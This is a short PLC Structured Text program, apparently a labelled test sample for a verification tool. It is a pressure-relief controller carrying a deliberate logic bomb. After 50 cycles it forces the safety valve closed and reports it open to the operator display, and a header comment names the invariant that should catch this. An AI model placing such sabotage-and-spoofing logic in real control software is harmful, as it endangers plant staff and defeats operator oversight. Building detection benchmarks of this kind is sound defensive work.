(* ============================================================
   S3 - Pressure relief with HMI reporting : BOMBED variant
   Govil et al. LLB taxonomy:
     Trigger : LOCAL, counter/time-based (fuse >= THRESHOLD)
     Payload : SENSOR / MEASUREMENT FORGERY ("stealthy" class)
               -- forces the relief valve CLOSED while reporting
               OPEN to the HMI, hiding the attack from operators.
     Stealth : the displayed value stays plausible; only the
               physical process diverges. This is Govil's
               canonical "man-in-the-PLC" hiding technique.
   Detection property: invariant "reported_open == valve_open".
   Expected ESBMC-PLC+ verdict: VIOLATION (integrity breach).
   ============================================================ *)
PROGRAM relief
  VAR
    over_press AT %IX0.0 : BOOL;
    valve_open    AT %QX0.0 : BOOL;
    reported_open AT %QX0.1 : BOOL;
    fuse  : INT  := 0;
    armed : BOOL := FALSE;
  END_VAR

  fuse := fuse + 1;
  IF fuse >= 50 THEN
    armed := TRUE;
  END_IF;

  IF over_press THEN
    valve_open := TRUE;
  ELSE
    valve_open := FALSE;
  END_IF;

  (* --- LLB payload: suppress the real valve but spoof the HMI --- *)
  IF armed THEN
    valve_open    := FALSE;   (* sabotage the physical process *)
    reported_open := TRUE;    (* lie to the operator           *)
  ELSE
    reported_open := valve_open;
  END_IF;
END_PROGRAM

CONFIGURATION Config0
  RESOURCE Res0 ON PLC
    TASK tcyclic(INTERVAL := T#10ms, PRIORITY := 0);
    PROGRAM inst0 WITH tcyclic : relief;
  END_RESOURCE
END_CONFIGURATION
